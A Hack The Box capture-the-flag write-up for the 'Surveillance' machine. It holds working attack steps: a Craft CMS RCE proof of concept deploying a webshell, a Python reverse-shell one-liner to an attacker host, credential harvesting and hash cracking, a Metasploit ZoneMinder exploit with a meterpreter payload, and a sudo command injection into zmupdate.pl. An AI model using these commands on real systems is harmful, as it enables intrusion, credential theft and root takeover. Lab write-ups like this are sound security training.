![Surveillance](https://github.com/amalcew/htb-writeups/assets/73908014/2d4269c9-968a-441b-b008-f71db75fcc47)

This is first 'medium' level machine that I've pentested on HTB.

## Reconnaissance & port scanning

Let's start the enumeration with a classic `nmap` scan.

```bash
# Nmap 7.94SVN scan initiated Wed Mar 13 15:01:53 2024 as: nmap -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.245
Nmap scan report for 10.10.11.245 (10.10.11.245)
Host is up, received syn-ack (0.025s latency).
Scanned at 2024-03-13 15:01:53 CET for 8s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 13 15:02:01 2024 -- 1 IP address (1 host up) scanned in 8.29 seconds
```

As we can see, the machine has open ports 22, 80 which means it allows `ssh` access and host a webpage. The IP should be added to `/etc/hosts` before exploring the website:

```bash
> echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
```

![01-initial_webpage](https://github.com/amalcew/htb-writeups/assets/73908014/8f84028b-3a63-40ef-ae75-99520e8976e8)

Next on the checklist is enumerating possible directories on the website using `ffuf`:

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://surveillance.htb/FUZZ -t 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://surveillance.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

... SNIP ...

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 726ms]
index                   [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 740ms]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 483ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1019ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 258ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 225ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 244ms]

... SNIP ...

```

`ffuf` found the admin page:

![02-admin_login](https://github.com/amalcew/htb-writeups/assets/73908014/c9b48d45-ab78-4543-99c0-deaa55648e73)

the prompt was of course well-secured and did not allow any default credentials, but the page itself revealed information about the backend of the webpage.

![03-cms_version_reveal](https://github.com/amalcew/htb-writeups/assets/73908014/efecb12d-0816-41f0-ab9e-9085dd6fd906)

As we can see, this page utilizes **Craft CMS 4.4.14**. As google revealed, this version of the CMS is vulnerable to critical RCE [CVE-2023-41892](https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/)

Firstly, we need to check the host if it is indeed vulnerable (using the payload used in the paper):

![04-rce_poc](https://github.com/amalcew/htb-writeups/assets/73908014/92661979-f5c8-4d25-b809-7d95431e45dc)

As it is visible, the website returned `phpinfo`. Very bad behavior for the website, great opportunity for the threat actor.

## Initial foothold

In order to receive initial foothold it is required to somehow exploit the vulnerability. Simple shell spawning by `shell_exec` function does not work, as the server don't understand the request. 
There are a lot of working POCs on the internet, one of them is [Faelian's POC](https://github.com/Faelian/CraftCMS_CVE-2023-41892).

Execution of the POC returns pseudo-shell which can be used to spawn proper reverse shell.

```bash
> python cve-2023-41892.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
> nc -lvnp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.245] 50966
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After stablising the shell, we are ready to go.

## Escalating privileges and obtaining user flag

### Database & dead end

The target machine runs MariaDB database:

```bash
www-data@surveillance:~/html/craft/web$ systemctl list-units --type=service
  UNIT                               LOAD   ACTIVE SUB     DESCRIPTION         >
  apparmor.service                   loaded active exited  Load AppArmor profil>

  ... SNIP ...

  lvm2-pvscan@8:3.service            loaded active exited  LVM event activation>
  mariadb.service                    loaded active running MariaDB 10.6.12 data>
  ModemManager.service               loaded active running Modem Manager

  ... SNIP ...
```

Under `/var/html/craft` there is `.env` file which reveals credentials to the database

```bash
www-data@surveillance:~/html/craft$ cat .env
# Read about configuration, here:
# https://craftcms.com/docs/4.x/config/

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# The secure key Craft will use for hashing and encrypting data
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_

# Database connection settings
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craftdb
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=C*******************!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

# General settings (see config/general.php)
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false

PRIMARY_SITE_URL=http://surveillance.htb/
```

Using the credentials I've connected to the database and listed the tables:

```bash
www-data@surveillance:~/html/craft$ mariadb --user=craftuser --password=**** craftdb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [craftdb]> show tables;
+----------------------------+
| Tables_in_craftdb          |
+----------------------------+
| addresses                  |
| announcements              |

... SNIP ...

| userpreferences            |
| users                      |
| volumefolders              |
| volumes                    |
| widgets                    |
+----------------------------+
63 rows in set (0.001 sec)
```

There is table named `users`, containing a hashed password of admin.

```bash
MariaDB [craftdb]> select username, email, password from users;
+----------+------------------------+--------------------------------------------------------------+
| username | email                  | password                                                     |
+----------+------------------------+--------------------------------------------------------------+
| admin    | admin@surveillance.htb | $2y$13$F************************************************8tGe |
+----------+------------------------+--------------------------------------------------------------+
```

Sadly, this hash was probably a dead end, as no attempt to crack the hash was successful. 

### Second hash inside backup

Machine has two `/home` directories for users `matthew` and `zoneminder`. As the first attempt of escalating privileges was not fruitful I started to explore the machine for other possible informations.

Interestingly, there is a file `surveillance--2023-10-17-202801--v4.4.14.sql.zip` stored in `/var/www/html/craft/storage/backups`.
The unzipped file is a set of queries that looks like a backup script and it contains some very interesting information about previously discovered user Matthew:


```bash
... SNIP...

--
-- Dumping data for table `users`
--
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed********************************************************70ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;

... SNIP ...
```

Apperantly, Matthew is the admin of the webpage. Which means that the discovered hash inserted into backup table could be a valid password. This time password cracking was a success:

```bash
> john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***************  (?)  
1g 0:00:00:00 DONE (2024-03-14 14:15) 3.448g/s 12429Kp/s 12429Kc/s 12429KC/s stefon23..sozardme
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 

```

And the password was a valid one:

```bash
> ssh matthew@10.10.11.245
matthew@10.10.11.245's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Mar 14 03:16:19 PM UTC 2024

  System load:  0.1923828125      Processes:             228
  Usage of /:   84.2% of 5.91GB   Users logged in:       1
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Mar 14 14:58:56 2024 from xx.xx.xx.xx
matthew@surveillance:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)
```

We can now read the user's flag:

```bash
matthew@surveillance:~$ cat user.txt 
2e68************************7a6c
```

## Root privileges escalation

### Exploiting Zoneminder

The machine is not rooted yet, as there is enigmatic user `zoneminder`. First thing to check is allowed commands with `sudo`:

```bash
matthew@surveillance:~$ sudo -l
[sudo] password for matthew:                                                                                         
Sorry, user matthew may not run sudo on surveillance.
```

This attempt was not successful, moving next I've focused on gaining more info about the environment. To explore more about the machine I've used the `linpeas` enumerating script, which discovered port `8080` in internal use:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/7bac16fc-1105-45ee-a0dc-04742f04c30c)

To access the service it is required to forward local ports using `ssh`:

```bash
> ssh -L 8080:localhost:8080 matthew@10.10.11.245
matthew@10.10.11.245's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

...SNIP...
```

Now we can access the hidden website in the browser:

![05-hidden_webpage](https://github.com/amalcew/htb-writeups/assets/73908014/145d7381-bba4-4785-9ba4-800b543fbec4)

So that's why there is a second standard user `zoneminder`! This is obviously the next step in the privileges escalation we should take.

The `linpeas` report dumped also some credentials to database used by the website:

![Screenshot_2024-04-11_23-48-51](https://github.com/amalcew/htb-writeups/assets/73908014/854bdf1b-da00-469e-aaf7-4cb2aa191064)

but sadly our curent user cannot perform any commands to access the db. As we have no credentials to the panel, we need to dig deeper.

After some searching, I've found the `config.php` file of the Zoneminder, that revealed the version of the service:

```bash
matthew@surveillance:/usr/share/zoneminder/www/includes$ cat config.php | grep VERSION
define( 'ZM_VERSION', '1.36.32' );               // Version
```

Quick Google search revealed, that this versoin is vulnerable to [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035), which affects the snapshot action of the service. There is neat metasploit exploit, that we will use during escalation:

```bash
msf6 exploit(unix/webapp/zoneminder_snapshots) > show options

Module options (exploit/unix/webapp/zoneminder_snapshots):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                         /basics/using-metasploit.html
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The ZoneMinder path
   URIPATH    /                no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address o
                                       n the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET
                                                  )
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      zCaBjCTwPNZ      no        Name to use on remote system when storing payload; cannot contai
                                                  n spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               xx.xx.xx.xx      yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   nix Command



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/zoneminder_snapshots) > exploit

[*] Started reverse TCP handler on xx.xx.xx.xx:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Elapsed time: 18.276545536999947 seconds.
[+] The target is vulnerable.
[*] Fetching CSRF Token
[+] Got Token: key:f06ff060f84e8b20b7d6bd3a4ee34a3479428d47,1712871056
[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3045380 bytes) to 10.10.11.245
[*] Meterpreter session 1 opened (xx.xx.xx.xx:4444 -> 10.10.11.245:44972) at 2024-04-11 23:30:55 +0200
[+] Payload sent

meterpreter > shell
Process 48175 created.
Channel 1 created.
id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

After some shell stabilization, we are ready to target the root account.

### Exploiting service scripts

This time when checking the allowed commands with `sudo` privilege, there are some very interesting result:

```bash
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

Moving to the suggested directory, we can find some Zoneminder service scripts, that we can use to gain access over root:

```bash
zoneminder@surveillance:/usr/bin$ ls -al | grep zm | grep .pl
ls -al | grep zm | grep .pl
-rwxr-xr-x  1 root root       43027 Nov 23  2022 zmaudit.pl
-rwxr-xr-x  1 root root       12939 Nov 23  2022 zmcamtool.pl
-rwxr-xr-x  1 root root        6043 Nov 23  2022 zmcontrol.pl
-rwxr-xr-x  1 root root       26232 Nov 23  2022 zmdc.pl
-rwxr-xr-x  1 root root       35206 Nov 23  2022 zmfilter.pl
-rwxr-xr-x  1 root root        5640 Nov 23  2022 zmonvif-probe.pl
-rwxr-xr-x  1 root root       19386 Nov 23  2022 zmonvif-trigger.pl
-rwxr-xr-x  1 root root       13994 Nov 23  2022 zmpkg.pl
-rwxr-xr-x  1 root root       17492 Nov 23  2022 zmrecover.pl
-rwxr-xr-x  1 root root        4815 Nov 23  2022 zmstats.pl
-rwxr-xr-x  1 root root        2133 Nov 23  2022 zmsystemctl.pl
-rwxr-xr-x  1 root root       13111 Nov 23  2022 zmtelemetry.pl
-rwxr-xr-x  1 root root        5340 Nov 23  2022 zmtrack.pl
-rwxr-xr-x  1 root root       18482 Nov 23  2022 zmtrigger.pl
-rwxr-xr-x  1 root root       45421 Nov 23  2022 zmupdate.pl
-rwxr-xr-x  1 root root        8205 Nov 23  2022 zmvideo.pl
-rwxr-xr-x  1 root root        7022 Nov 23  2022 zmwatch.pl
-rwxr-xr-x  1 root root       19655 Nov 23  2022 zmx10.pl
```

The most useful script is `zmupdate.pl` as it is used to update Zoneminder database and takes database credentials discovered previously. After some research and tinkering on the [source](https://github.com/ZoneMinder/ZoneMinder/blob/master/scripts/zmupdate.pl.in) of the script I've managed to use the script and command injection on user parameter, I've been able to read the root flag:

```bash
zoneminder@surveillance:/usr/bin$ sudo ./zmupdate.pl -v 1.36.31 -u ';cat /root/root.txt;'
sudo ./zmupdate.pl -v 1.36.31 -u ';cat /root/root.txt;'

Initiating database upgrade to version 1.36.32 from version 1.36.31

WARNING - You have specified an upgrade from version 1.36.31 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 


Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
y
Creating backup to /tmp/zm/zm-1.36.31.dump. This may take several minutes.
mysqldump: option '-u' requires an argument
sh: 1: -pZoneMinderPassword2023: not found
Output: 1726************************089c
Command 'mysqldump -u;cat /root/root.txt; -p'ZoneMinderPassword2023' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-1.36.31.dump' exited with status: 127
zoneminder@surveillance:/usr/bin$ 
```
